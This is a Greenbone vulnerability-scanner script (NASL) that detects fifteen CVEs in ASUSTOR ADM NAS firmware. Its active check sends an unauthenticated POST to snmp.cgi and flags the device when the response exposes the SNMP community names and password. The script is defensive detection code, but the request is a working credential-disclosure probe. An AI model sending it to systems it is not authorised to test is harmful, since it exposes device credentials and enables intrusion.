# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:asustor:adm";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141755");
  script_version("2023-08-22T05:06:00+0000");
  script_tag(name:"last_modification", value:"2023-08-22 05:06:00 +0000 (Tue, 22 Aug 2023)");
  script_tag(name:"creation_date", value:"2018-12-05 10:58:25 +0700 (Wed, 05 Dec 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2018-12305", "CVE-2018-12306", "CVE-2018-12307", "CVE-2018-12308",
                "CVE-2018-12309", "CVE-2018-12310", "CVE-2018-12311", "CVE-2018-12312",
                "CVE-2018-12313", "CVE-2018-12314", "CVE-2018-12315", "CVE-2018-12316",
                "CVE-2018-12317", "CVE-2018-12318", "CVE-2018-12319");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ASUSTOR ADM < 3.1.3.RHU2 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_asustor_adm_http_detect.nasl");
  script_mandatory_keys("asustor/adm/http/detected");
  script_require_ports("Services/www", 8000);

  script_tag(name:"summary", value:"ASUSTOR ADM is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2018-12305: Cross-Site Scripting via SVG Images

  - CVE-2018-12306: Directory Traversal via download.cgi

  - CVE-2018-12307: Command Injection in user.cgi

  - CVE-2018-12308: Shared Folder Encryption Key Sent as URL Parameter

  - CVE-2018-12309: Directory Traversal via upload.cgi

  - CVE-2018-12310: Cross-Site Scripting on Login page

  - CVE-2018-12311: Missing Input Sanitization on File Explorer filenames

  - CVE-2018-12313: Unauthenticated Command Injection in SNMP API

  - CVE-2018-12314: Directory Traversal via downloadwallpaper.cgi

  - CVE-2018-12315: Password Change Does Not Require Existing Password

  - CVE-2018-12316: Command Injection in upload.cgi

  - CVE-2018-12317: Command Injection in group.cgi

  - CVE-2018-12318: snmp.cgi Returns Password in Cleartext

  - CVE-2018-12319: Login Denial of Service");

  script_tag(name:"affected", value:"ASUSTOR ADM prior to version 3.1.3.RHU2.");

  script_tag(name:"solution", value:"Update to version 3.1.3.RHU2 or later.");

  script_xref(name:"URL", value:"https://blog.securityevaluators.com/unauthenticated-remote-code-execution-in-asustor-as-602t-2d806c30dcea");
  script_xref(name:"URL", value:"https://blog.securityevaluators.com/over-a-dozen-vulnerabilities-discovered-in-asustor-as-602t-8dd5832a82cc");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/portal/apis/services/snmp.cgi?act=get&tab=Get&_dc=1530552418588";

headers = make_array("X-Requested-With", "XMLHttpRequest",
                     "Content-Length",   "0");

req = http_post_put_req( port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ('"success": true' >< res && '"passwd":' >< res) {
  report = 'It was possible to obtain the SNMP settings including the community names and password.' +
           '\n\nResult:\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
